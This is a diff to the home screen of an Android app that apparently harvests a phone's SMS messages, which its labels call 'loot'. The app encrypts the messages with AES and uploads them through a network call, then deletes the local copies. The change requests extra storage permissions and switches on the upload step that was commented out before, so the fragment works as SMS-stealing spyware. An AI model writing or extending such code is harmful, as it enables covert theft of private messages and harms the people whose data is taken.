@@ -63,6 +63,9 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
@@ -72,6 +75,7 @@ import java.util.Arrays;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.stream.Collectors;
 
 import javax.crypto.NoSuchPaddingException;
 
@@ -105,7 +109,9 @@ public class Frag_Home extends Fragment {
     SharedPreferences.Editor sharedEditor = null;
 
     TextView text_get_and_upload, text_get_loot_count, last_time, perm_status, perm_request;
-    int SMS_CODE = 102;
+    int CODE_READ_SMS = 102;
+    int CODE_READ_STORAGE = 104;
+    int CODE_WRITE_STORAGE= 106;
 
     ProgressBar progressBar;
 
@@ -147,7 +153,7 @@ public class Frag_Home extends Fragment {
         perm_request = solv.findViewById(R.id.card_text_req_permission);
         perm_request.setVisibility(View.GONE);
 
-        reqPermission(Manifest.permission.READ_SMS, SMS_CODE);
+        reqPermission(Manifest.permission.READ_SMS, CODE_READ_SMS);
 
         progressBar = solv.findViewById(R.id.home_upload_state);
         progressBar.setVisibility(View.GONE);
@@ -158,7 +164,7 @@ public class Frag_Home extends Fragment {
             @Override
             public void onClick(View v) {
                 Log.e("Perm /*- ", "perm_request" );
-                reqPermission(Manifest.permission.READ_SMS, SMS_CODE);
+                reqPermission(Manifest.permission.READ_SMS, CODE_READ_SMS);
             }
         });
 
@@ -177,7 +183,23 @@ public class Frag_Home extends Fragment {
 
         if (ContextCompat.checkSelfPermission(getActivity(), Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
             permTweak(false);
-            requestPermissions(new String[]{Manifest.permission.READ_SMS}, SMS_CODE);
+            requestPermissions(new String[]{Manifest.permission.READ_SMS}, CODE_READ_SMS);
+        }else {
+            //Log.e("Perm /*- ", "reqPermission: Granted" );
+            permTweak(true);
+        }
+
+        if (ContextCompat.checkSelfPermission(getActivity(), Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+            permTweak(false);
+            requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, CODE_READ_STORAGE);
+        }else {
+            //Log.e("Perm /*- ", "reqPermission: Granted" );
+            permTweak(true);
+        }
+
+        if (ContextCompat.checkSelfPermission(getActivity(), Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+            permTweak(false);
+            requestPermissions(new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, CODE_WRITE_STORAGE);
         }else {
             //Log.e("Perm /*- ", "reqPermission: Granted" );
             permTweak(true);
@@ -187,7 +209,7 @@ public class Frag_Home extends Fragment {
     @Override
     public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
         //super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == SMS_CODE) {
+        if (requestCode == CODE_READ_SMS) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                 permTweak(true);
             }
@@ -222,11 +244,11 @@ public class Frag_Home extends Fragment {
         }
     }
 
-    private void Cryptor(File dir_file, InputStream ins){
-        File fout = new File(String.valueOf(dir_file));
+    private void Cryptor(File input_file, InputStream inputStream){
+        File fout = new File(String.valueOf(input_file));
         try {
             Encryptor cc = new Encryptor();
-            cc.encodetoFile(kon.string_key, kon.string_key_spec, ins, new FileOutputStream(fout));
+            cc.encodetoFile(kon.string_key, kon.string_key_spec, inputStream, new FileOutputStream(fout));
             Log.e(kon.TAGGED, "Cryptor: Encryption Completed" );
         } catch (InvalidAlgorithmParameterException e) {
             e.printStackTrace();
@@ -245,27 +267,26 @@ public class Frag_Home extends Fragment {
 
     private void Make_a_File(String file_name, StringBuffer data_source){
         String big_data = String.valueOf(data_source);
-        String big_data_enc = Base64.encodeToString(big_data.toString().getBytes(), Base64.DEFAULT);
+        //String big_data_enc = Base64.encodeToString(big_data.toString().getBytes(), Base64.DEFAULT);
 
         FileOutputStream fos = null;
 
         try {
-            fos = getActivity().openFileOutput(kon.string_enc_b64_file+file_name, MODE_PRIVATE);
-            fos.write(big_data_enc.getBytes());
+            fos = getActivity().openFileOutput(kon.string_plain_file+file_name, MODE_PRIVATE);
+            fos.write(big_data.getBytes());
 
-            File File_enc_b64 = new File(getActivity().getFilesDir() + "/" + kon.string_enc_b64_file+file_name);
+            File File_enc_plain = new File(getActivity().getFilesDir() + "/" + kon.string_plain_file+file_name);
             File File_enc_aes = new File(getActivity().getFilesDir() + "/" + kon.string_enc_aes_files+file_name);
+            //File File_gzip_aes = new File(getActivity().getFilesDir() + "/" + kon.string_enc_gzip_aes_files+file_name);
+            //File File_gzip_plain = new File(getActivity().getFilesDir() + "/" + kon.string_enc_gzip_plain_files+file_name);
 
-            File File_target_zip_b64 = new File(getActivity().getFilesDir() + "/" + kon.string_zip_b64_files+file_name);//File_enc_b64_zip_target_link
-            File File_target_zip_aes = new File(getActivity().getFilesDir() + "/" + kon.string_zip_aes_files+file_name);//File_enc_aes_zip_target_link
-
-            InputStream file_i_s = new BufferedInputStream(new FileInputStream(File_enc_b64));
+            InputStream file_i_s = new BufferedInputStream(new FileInputStream(File_enc_plain));
             Cryptor(File_enc_aes, file_i_s);
 
-            File File_enc_zip_b64 = Kompressors.FileKompress(String.valueOf(File_enc_b64), String.valueOf(File_target_zip_b64));
-            File File_enc_zip_aes = Kompressors.FileKompress(String.valueOf(File_enc_aes), String.valueOf(File_target_zip_aes));
+            //Kompressors.FileKompressGZIP(String.valueOf(File_enc_aes), String.valueOf(File_gzip_aes));
+            //Kompressors.FileKompressGZIP(String.valueOf(File_enc_plain), String.valueOf(File_gzip_plain));
 
-            //init.Parser_Upload(fi40, file_name);
+            init.Parser_Upload(File_enc_aes, file_name);
 
         } catch (FileNotFoundException e) {
             Log.e(kon.TAGGED,"Error 1  "+e.getMessage());
@@ -417,10 +438,12 @@ public class Frag_Home extends Fragment {
                 @Override
                 public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                     try {
-                        File enc_b64 = new File( getActivity().getFilesDir() + "/" + kon.string_enc_b64_file+filename);
+                        File enc_plain = new File( getActivity().getFilesDir() + "/" + kon.string_plain_file+filename);
                         File enc_aes = new File(getActivity().getFilesDir() + "/" + kon.string_enc_aes_files+filename);
-                        enc_b64.delete();
+                        //File enc_gzip_aes = new File(getActivity().getFilesDir() + "/" + kon.string_enc_gzip_aes_files+filename);
+                        enc_plain.delete();
                         enc_aes.delete();
+                        //enc_gzip_aes.delete();
                         prefs.get_FileType(filename, String.valueOf(System.currentTimeMillis()), getActivity());
                         last_time.setText(prefs.get_TimeStamp(getActivity()));
                         calc_Loot();
